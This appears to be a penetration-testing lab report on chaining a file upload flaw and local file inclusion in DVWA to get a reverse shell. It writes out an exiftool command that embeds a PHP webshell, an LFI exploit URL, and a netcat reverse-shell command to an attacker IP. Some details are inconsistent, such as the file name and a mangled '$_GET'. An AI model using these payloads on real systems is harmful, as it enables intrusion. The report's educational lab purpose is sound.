# Remote Command Execution via File Upload and Local File Inclusion on DVWA Web Application

## Overview

The following report documents the results of a simulated attack that exploits a File Upload vulnerability and a Local File Inclusion one, leading to the compromise of a web server via Remote Code Execution, by using techniques involving hiding information (malicious payloads) inside a file (steganography).

## Attack Methods 
### File Upload
File Upload vulnerabilities occur when a web application allows users to upload files to the server's filesystem without sufficient checks on their type, contents, or size. A common consequence of these events is the execution of unauthorized code or commands ("Execution" and "Impact" tactics in the MITRE ATT&CK Framework). If the uploaded file contains malicious code that the web server processes, an attacker can arbitrary execute it on the victim's machine.

### Local File Inclusion
Local File Inclusion vulnerabilities occur when an application includes a local file without handling the input path. This allows an attacker to read and, in some cases, execute local files present on the victim machine. Is is usually caused by misconfigurations or insufficient input validation, leading, for example, to arbitrary code execution.

The combination (or "chaining") of these two vulnerabilities allows an attacker to bypass upload restrictions: the malicious code is first injected into a seemingly benign file (an image), successfully uploaded, and subsequently executed by forcing the server to parse it via the LFI vulnerability.

### Threat Model
External attacker with low-level privileges. Has valid credentials to log into the web application but has no direct access to the underlying operating system or command-line interface. However, the actor possesses intermediate technical skills (steganography).

The objective of the attack is to achieve Remote Code Execution (RCE) and establish an interactive persistent connection (Reverse Shell).

Consequences of this kind of attack can be loss of confidentiality and integrity for the application data, that may lead to local privilege escalation.

## Technical Configuration
This simulation has been done using Oracle VM Virtualbox, building an enviroment with two separate virtual machines both running Kali Linux  as O.S., configured respectively as the victim (hosting the Web App) and the attacker (gaining access to the target). ### Network Configuration
The two virtual machines are interconnected via an isolated Host-Only Network inside VirtualBox, in order to ensure that all malicious traffic, payloads, and the final reverse shell remain strictly inside the local simulated environment.

**Kali Linux**

An Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.

**DVWA**

Damn Vulnerable Web Application (DVWA) is a PHP/MariaDB web application that is damn vulnerable. The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficulty, with a simple straightforward interface. 

```exiftool``` 

ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.

**NetCat** ```nc``` 

Command-line, open source networking utility used for reading from and writing to network connections using TCP or UDP protocols. In particular, during this simulation it has been used to establish a local listener on the attacker's machine, capture the connection from the victim in order to begin a Reverse Shell session.

## Attack Flow

### Phase 0 - Initialization
First of all, the target environment hosting the Damn Vulnerable Web Application (DVWA) was initialized. The target virtual machine was booted, ensuring that services needed to host teh web application were fully operational.

### Phase 1 - Defense Analysis
The DVWA level is configured to **High**, which means that stricter defensive mechanisms are implemented:
- for File Upload: the file has to be necessarily *.jpeg or *.png, otherwise it would be rejected; by checking the Source Code of the webpage, it is clear that not only file having the correct extension suffices to bypass this restriction: the php function `getimagesize()` is used to validate the input, as it would return 0 if the input cannot be recognized as a picture; in addition, it does not consider file's metadata (feature that is going to be exploited);
- for File Inclusion: the application restricts input by whitelisting filenames, requiring them to begin with the substring "file", as can be seen in the Source Code of the page. 

### Phase 2 - Payload Creation
This aim of this phase is to create a file to upload that contains PHP code in a way that it would be accepted from the Web Application.
First of all download a real JPEG picture; secondly, using `exiftool`, inject a command into the picture's metadata:
```bash
exiftool -Comment="<?php system(\_GET['cmd']); ?>" image.jpeg
``` 
The command puts in the metadata's Comment field a PHP script that will trigger a system call opening a shell executing the Linux command specified after the "cmd" parameter in the request.

Finally, change the file name into `shell.jpeg`, for personal clarity, without altering the original extension. 

Now the file is ready to be loaded and accepted from the Web Application.

### Phase 3 - Payload Upload
In the "File Upload" section of the DVWA we can upload the file prepared: it is accepted since it has the correct extension and the first bytes of the file correspond to a jpeg's ones. If the upload is successful, a message telling the location of the file and the success of the operation will appear. INSERIRE IMMAGINE

### Phase 4 - Listening Session
In order to execute RCE, a listening session has to be opened. In a new terminal, using `nc` (NetCat) command with the following flags on:
```bash
nc -lvnp 4444
```
`l` to make it work as a Server that waits connections, `v` to make it verbose, `n` to make it numeric-only (does not resolve DNS names) and `p` to specify the port on which it will be listening.

### Phase 5 - Execution
For this phase, go to the File Inclusion section. In order to execute the file on the victim machine, it is needed to modify the URL in this way:
```
.../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.php.jpeg&cmd=whoami
```
which is composed from:
- `file://`, the wrapper protocol used to bypass the restriction when accessing the file; it allows to access the local filesystem, making the input parameter begin with string "file" (DVWA High security level requirement)
- `/var/.../shell.php.jpeg`, the absolute path to the injected image file created and uploaded before;
- `cmd=`, the query parameter that would be considered from the script we injected in the image;
- `whoami`, the Linux command that will return the username of process running.

After loading this webpage, the content of the file will be seen on the screen: in the first few raw image bytes will be located the result of the command `whoami`, as showed in the picture below: IMMAGINE

Now, in order to connect to the Server opened in the previous phase, the `cmd` parameter content has to be changed in:

```
.../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.php.jpeg&cmd=nc%20192.168.56.102%204444%20-e%20/bin/bash
```

- `nc 192.168.56.102 4444 -e /bin/bash`, the Netcat command that will open the connection on port 4444 at 192.168.56.102, which is the ip address of the attacking machine; in the URL, spaces are filled with %20 since it is the URL encoding code for the space character, in order to avoid wrong behaviors of the HTTP request.

### Phase 6 - Reverse Shell
Now in the terminal opened before with the listening session active, the message of a connection received will be shown. It is now connected to the victim machine, as it can be seen when executing the `ip a` command, that will show the ip address 192.168.56.101, the victim's one. IMMAGINE 

## Conclusions

## Bibliography
**DVWA**: https://github.com/digininja/DVWA

**ExifTool**: https://exiftool.org/

https://www.php.net/manual/en/function.getimagesize.php#:~:text=The%20getimagesize()%20function%20will,the%20correspondent%20HTTP%20content%20type.

https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/
